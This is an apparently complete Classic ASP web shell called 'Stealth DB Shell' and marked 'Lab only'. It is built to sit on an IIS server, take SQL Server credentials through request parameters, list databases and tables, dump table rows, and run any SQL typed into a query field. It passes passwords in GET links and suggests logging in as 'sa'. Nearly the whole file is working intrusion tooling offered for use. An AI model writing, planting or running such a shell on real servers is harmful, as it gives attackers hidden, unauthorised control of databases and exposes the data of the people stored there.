<%@ Language=VBScript %>
<%
' Stealth Classic ASP DB Shell - Updated Providers 2026 Style (Lab only!)

Dim Conn, RS, ConnStr, ErrMsg
Dim srv, dbn, usr, pwd, act, qry, tbl

srv = Trim(Request("server") & Request.Form("server"))
dbn = Trim(Request("dbname") & Request.Form("dbname"))
usr = Trim(Request("user") & Request.Form("user"))
pwd = Trim(Request("pass") & Request.Form("pass"))
act = Request("act")
qry = Request("query")
tbl = Request("tbl")

ErrMsg = ""

If srv <> "" Then
    ' Try modern providers first (SQL Server Native Client or OLE DB Driver)
    ' Option 1: SQLNCLI11 (best for classic ASP + SQL 2012-2019)
    ConnStr = "Provider=SQLNCLI11;Server=" & srv & ";"
    If dbn <> "" Then ConnStr = ConnStr & "Database=" & dbn & ";"
    ConnStr = ConnStr & "Uid=" & usr & ";Pwd=" & pwd & ";"

    ' Option 2: MSOLEDBSQL (newest OLE DB driver, recommended by Microsoft 2017+)
    ' ConnStr = "Provider=MSOLEDBSQL;Server=" & srv & ";Database=" & dbn & ";Uid=" & usr & ";Pwd=" & pwd & ";"

    ' Option 3: ODBC Driver fallback (if above fail, install ODBC Driver 17/18 from Microsoft)
    ' ConnStr = "Driver={ODBC Driver 17 for SQL Server};Server=" & srv & ";Database=" & dbn & ";Uid=" & usr & ";Pwd=" & pwd & ";"

    ' Add port if needed (uncomment if port non-default)
    ' ConnStr = Replace(ConnStr, "Server=" & srv & ";", "Server=" & srv & ",1433;")

    ' For named instance example: srv = "localhost\SQLEXPRESS"

    Set Conn = Server.CreateObject("ADODB.Connection")
    On Error Resume Next
    Conn.Open ConnStr
    If Err.Number <> 0 Then
        ErrMsg = "Connection Failed: " & Err.Description & " (Code: " & Err.Number & ")<br><br>" & _
                 "Tips:<br>" & _
                 "- Server name try: localhost, 127.0.0.1, IP, or server\SQLEXPRESS<br>" & _
                 "- TCP/IP enabled in SQL Configuration Manager?<br>" & _
                 "- SQL Browser service running?<br>" & _
                 "- Firewall allow port 1433?<br>" & _
                 "- Try provider=SQLNCLI11 or MSOLEDBSQL (install if missing)"
        Set Conn = Nothing
    End If
    On Error Goto 0
End If
%>

<html>
<head><title>Stealth DB Shell - Updated</title></head>
<body style="font-family:consolas; background:#000; color:#0f0; padding:20px;">

<h2>DB Shell (Connection Form - Try Different Providers)</h2>

<form method="post">
    Server: <input name="server" value="<%=Server.HTMLEncode(srv)%>" size="40" placeholder="localhost / 127.0.0.1 / IP / server\SQLEXPRESS"><br><br>
    DB: <input name="dbname" value="<%=Server.HTMLEncode(dbn)%>" size="40" placeholder="master"><br><br>
    User: <input name="user" value="<%=Server.HTMLEncode(usr)%>" size="40"><br><br>
    Pass: <input type="password" name="pass" value="<%=Server.HTMLEncode(pwd)%>" size="40"><br><br>
    <input type="submit" value="Connect">
</form>

<% If ErrMsg <> "" Then %>
    <div style="color:red; background:#300; padding:15px; margin:15px 0; border:2px solid red; font-weight:bold;">
        <%=ErrMsg%>
    </div>
<% ElseIf Conn Is Nothing Then %>
    <p style="color:yellow;">Connect first. Try server: localhost or 127.0.0.1, db: master, user: sa.</p>
<% Else %>
    <div style="color:lime; background:#030; padding:15px; border:2px solid lime;">
        Connected! Server: <%=srv%> | Current DB: <%=dbn%>
    </div>

    <h3>Databases (click for tables)</h3>
    <%
    Set RS = Conn.Execute("SELECT name FROM sys.databases WHERE database_id > 4 ORDER BY name")
    Do While Not RS.EOF
        Response.Write "<a href='?act=tables&server=" & Server.URLEncode(srv) & "&user=" & Server.URLEncode(usr) & "&pass=" & Server.URLEncode(pwd) & "&dbname=" & Server.URLEncode(RS("name")) & "'>" & RS("name") & "</a><br>"
        RS.MoveNext
    Loop
    RS.Close
    %>

    <h3>Custom Query (tables test: SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES)</h3>
    <form method="get">
        <input type="hidden" name="server" value="<%=Server.URLEncode(srv)%>">
        <input type="hidden" name="user" value="<%=Server.URLEncode(usr)%>">
        <input type="hidden" name="pass" value="<%=Server.URLEncode(pwd)%>">
        <input type="hidden" name="dbname" value="<%=Server.URLEncode(dbn)%>">
        Query: <input name="query" size="80" value="SELECT @@version"><br>
        <input type="submit" value="Run">
    </form>

    <% If qry <> "" Then %>
        <h4>Query Result:</h4>
        <pre style="background:#111; padding:15px; border:1px solid #0f0; white-space:pre-wrap;">
        <%
        Set RS = Conn.Execute(qry)
        If Not RS.EOF Then
            Do While Not RS.EOF
                For Each fld In RS.Fields
                    Response.Write fld.Name & ": " & Server.HTMLEncode(fld.Value & "") & vbCrLf
                Next
                Response.Write "-------------------" & vbCrLf
                RS.MoveNext
            Loop
        Else
            Response.Write "Query OK (no rows or non-select)."
        End If
        RS.Close
        %>
        </pre>
    <% End If %>

    <% If act = "tables" And dbn <> "" Then %>
        <h3>Tables in <%=dbn%></h3>
        <%
        On Error Resume Next
        Conn.Execute "USE [" & dbn & "]"
        If Err.Number <> 0 Then
            Response.Write "<div style='color:red;'>USE failed: " & Err.Description & "</div>"
        Else
            Set RS = Conn.Execute("SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE='BASE TABLE' ORDER BY TABLE_NAME")
            If Err.Number <> 0 Then
                Response.Write "<div style='color:red;'>Tables query failed: " & Err.Description & "</div>"
            Else
                Do While Not RS.EOF
                    Response.Write "<a href='?act=browse&server=" & Server.URLEncode(srv) & "&user=" & Server.URLEncode(usr) & "&pass=" & Server.URLEncode(pwd) & "&dbname=" & Server.URLEncode(dbn) & "&tbl=" & Server.URLEncode(RS("TABLE_NAME")) & "'>" & RS("TABLE_NAME") & "</a><br>"
                    RS.MoveNext
                Loop
            End If
            RS.Close
        End If
        On Error Goto 0
        %>
    <% End If %>

    <% If act = "browse" And tbl <> "" Then %>
        <h3>Data from <%=tbl%> (top 50 rows)</h3>
        <%
        Conn.Execute "USE [" & dbn & "]"
        Set RS = Conn.Execute("SELECT TOP 50 * FROM [" & tbl & "]")
        If Not RS.EOF Then
            Response.Write "<table border='1' style='border-color:#0f0; color:#0f0;'>"
            Response.Write "<tr>"
            For Each fld In RS.Fields
                Response.Write "<th>" & fld.Name & "</th>"
            Next
            Response.Write "</tr>"
            Do While Not RS.EOF
                Response.Write "<tr>"
                For Each fld In RS.Fields
                    Response.Write "<td>" & Server.HTMLEncode(fld.Value & "") & "</td>"
                Next
                Response.Write "</tr>"
                RS.MoveNext
            Loop
            Response.Write "</table>"
        Else
            Response.Write "No data or issue."
        End If
        RS.Close
        %>
    <% End If %>
<% End If %>

</body>
</html>

<%
If IsObject(RS) Then RS.Close
If IsObject(Conn) Then Conn.Close
%>
